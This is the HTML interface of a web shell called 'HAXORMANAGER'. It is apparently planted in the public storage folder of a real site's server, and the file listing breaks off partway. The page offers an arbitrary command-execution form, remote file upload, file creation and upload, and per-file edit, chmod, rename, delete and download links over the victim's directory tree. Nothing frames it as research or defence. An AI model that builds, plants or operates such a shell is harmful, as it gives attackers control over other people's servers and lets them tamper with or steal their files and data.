<html><head><title>HAXORMANAGER</title><style>
    body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
    h1 { color: #7289da; text-align: center; }
    input[type="text"], input[type="password"], input[type="url"], input[type="submit"], input[type="file"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
    input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
    table { width: 90%; margin: 20px auto; border-collapse: collapse; }
    th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
    th { background-color: #7289da; }
    a { color: #7289da; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .container { width: 80%; margin: 0 auto; }
    textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
</style></head><body><div class="container"><h1>HAXORMANAGER</h1><p>This is a simple file manager tool created by HaxorNoname.</p><form method="post">
        <input type="text" name="cmd" placeholder="Enter command" required />
        <input type="submit" value="Execute" />
      </form><form method="post">
        <input type="url" name="remote_url" placeholder="Remote File URL" required />
        <input type="submit" value="Remote Upload" />
      </form><form method="get">
        <input type="text" name="search" placeholder="Search files or folders" />
        <input type="submit" value="Search" />
      </form><a href="?HX=/">/</a><a href="?HX=/var">var</a>/<a href="?HX=/var/www">www</a>/<a href="?HX=/var/www/maduvvariweb">maduvvariweb</a>/<a href="?HX=/var/www/maduvvariweb/storage">storage</a>/<a href="?HX=/var/www/maduvvariweb/storage/app">app</a>/<a href="?HX=/var/www/maduvvariweb/storage/app/public">public</a>/<br><br><form method="post">
        <input type="text" name="new_name" placeholder="Enter file/folder name" required />
        <input type="submit" name="create_file" value="Create File" />
        <input type="submit" name="create_dir" value="Create Directory" />
      </form><br><form enctype="multipart/form-data" method="POST">
        <input type="file" name="file" required />
        <input type="submit" value="Upload" />
      </form><table><tr>
            <td>Directory</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.config">.config</a></td>
            <td>-</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.config">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.config">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.config">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.config" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/.config">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.gitignore">.gitignore</a></td>
            <td>14</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.gitignore" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/.gitignore">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.htaccess">.htaccess</a></td>
            <td>0</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.htaccess" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/.htaccess">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">01JDZ9FMMVWP45M5F8J2NY4P53.png</a></td>
            <td>332882</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">01JDZAE4FW520MYGE7QEAQ1D4V.jpg</a></td>
            <td>35123</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">01JDZB375PCQ64C4MCW8DZ38HF.png</a></td>
            <td>201788</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">01JDZBCSCSXHRZ27SDTJ2EYG81.png</a></td>
            <td>46778</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">01JDZBDTRY1FBRTM3WRHA62DYS.png</a></td>
            <td>46778</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Chmod</a> | 
                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Rename</a> | 
                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png" onclick="return confirm('Are you sure?')">Delete</a> |
                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Download</a>
            </td>
          </tr><tr>
            <td>File</td>
            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">01JDZBETPNCKP7SE4708R8QMBT.png</a></td>
            <td>46778</td>
            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">Edit</a> | 
                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">Chmod</a> | 
                